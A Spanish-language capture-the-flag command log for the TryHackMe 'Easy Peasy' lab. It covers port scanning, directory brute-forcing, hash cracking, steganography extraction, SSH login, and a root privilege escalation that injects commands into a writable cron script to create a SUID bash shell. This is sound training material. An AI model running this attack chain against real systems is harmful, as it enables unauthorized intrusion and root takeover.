# Comandos — LAB-018 Easy Peasy

Ejecutar solo contra la IP de la máquina activa del laboratorio TryHackMe. Sustituir la IP si la sala asigna otra.

## Reconocimiento

    nmap --top-ports 100 -sV -sC -oN nmap100.txt 10.66.129.175
    nmap -p- --open -sV -oN nmap-completo.txt 10.66.129.175
    nmap -p- --open -sC -sV -T5 -oN nmap-completo.txt 10.66.129.175

## Enumeración HTTP

    curl -i http://10.66.129.175/
    curl -i http://10.66.129.175/robots.txt
    gobuster dir -u http://10.66.129.175/ -w /usr/share/wordlists/dirb/common.txt -o gobuster-80.txt
    curl -i -L http://10.66.129.175/hidden/whatever
    gobuster dir -u http://10.66.129.175/hidden/ -w /usr/share/wordlists/dirb/common.txt -o gobuster-hidden.txt
    gobuster dir -u http://10.66.129.175:65524/ -w /usr/share/wordlists/dirb/common.txt -o gobuster-65524.txt
    curl -i http://10.66.129.175:65524/robots.txt
    curl -i http://10.66.129.175:65524/n0th1ng3ls3m4tt3r/

## Codificación, hash e imagen

    printf '%s\n' 'CADENA_BASE64' | base64 -d
    hashid 'HASH'
    john --format=Raw-SHA256 --wordlist=/ruta/a/easypeasy.txt hash.txt
    john --format=GOST --wordlist=/ruta/a/easypeasy.txt hash.txt
    wget -O binarycodepixabay.jpg http://10.66.129.175:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
    steghide extract -sf binarycodepixabay.jpg -p 'FRASE_STEGHIDE'
    cat secrettext.txt

Los intentos con Raw-SHA256 y GOST no llegaron a probar candidatos porque easypeasy.txt no estaba en ~/Downloads. John informó “No such file or directory”; la ruta debe apuntar a la ubicación real de la lista proporcionada por la sala. No se conserva una salida exitosa de John.

## Decodificar contraseña binaria

    python3 -c "print(bytes(int(b, 2) for b in 'BITS_BINARIOS'.split()).decode())"

## SSH y user flag

    ssh -p 6498 boring@10.66.129.175
    cat ~/user.txt
    printf '%s\n' 'TEXTO_ROT13' | tr 'A-Za-z' 'N-ZA-Mn-za-m'

## Revisar cron y escalar en la máquina

    id
    cat /etc/crontab
    ls -l /var/www/.mysecretcronjob.sh
    cat /var/www/.mysecretcronjob.sh
    printf '%s\n' 'cp /bin/bash /tmp/rootbash' 'chmod u+s /tmp/rootbash' >> /var/www/.mysecretcronjob.sh
    ls -l /tmp/rootbash
    /tmp/rootbash -p
    id
    cat /root/.root.txt
